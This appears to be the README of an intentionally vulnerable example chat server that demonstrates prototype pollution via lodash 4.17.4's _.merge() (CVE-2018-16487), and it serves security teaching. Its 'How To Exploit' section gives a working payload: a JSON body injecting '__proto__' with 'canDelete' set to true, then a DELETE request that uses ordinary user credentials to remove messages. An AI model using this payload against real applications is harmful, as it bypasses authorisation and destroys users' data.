# Prototype Pollution in JavaScript

Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

If you want to learm more about the vulnerability you are welcome to explore [the interactive leasson](https://learn.snyk.io/lessons/prototype-pollution/javascript/) provided by Snyk.

## Example Application

This is example chat server vulnerable to Prototype Pollution.

- `GET /` - List all messages (available without authentication).
  ```bash
  curl --request GET --url http://localhost:3000/
  ```
- `PUT /` - Post a new message (only registered users).
  ```bash
  curl --request PUT \
    --url http://localhost:3000/ \
    --header 'content-type: application/json' \
    --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
  ```
- `DELETE /` - Delete a message (only administrators).
  ```bash
  curl --request DELETE \
    --url http://localhost:3000/ \
    --header 'content-type: application/json' \
    --data '{"auth": {"name": "admin", "password": "???"}, "messageId": 2}'
  ```

An attacker target here is to delete message without administrator credentials.

## Run

- `npm install`
- `npm start`

## Vulnerability

The Prototype Pollution vulnerability (CVE-2018-16487) introduced by [lodash@4.17.4](https://www.npmjs.com/package/lodash/v/4.17.4) via `_.merge()` function. More details about the issue you can find on [Snyk website](https://snyk.io/vuln/SNYK-JS-LODASH-73638).

## How To Exploit

1. Send evil message with `__proto__`.
   ```bash
   curl --request PUT \
     --url http://localhost:3000/ \
     --header 'content-type: application/json' \
     --data '{"auth": {"name": "user", "password": "pwd"}, "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
   ```
2. Delete any message you want using user's credentials.
   ```bash
   curl --request DELETE \
     --url http://localhost:3000/ \
     --header 'content-type: application/json' \
     --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
   ```
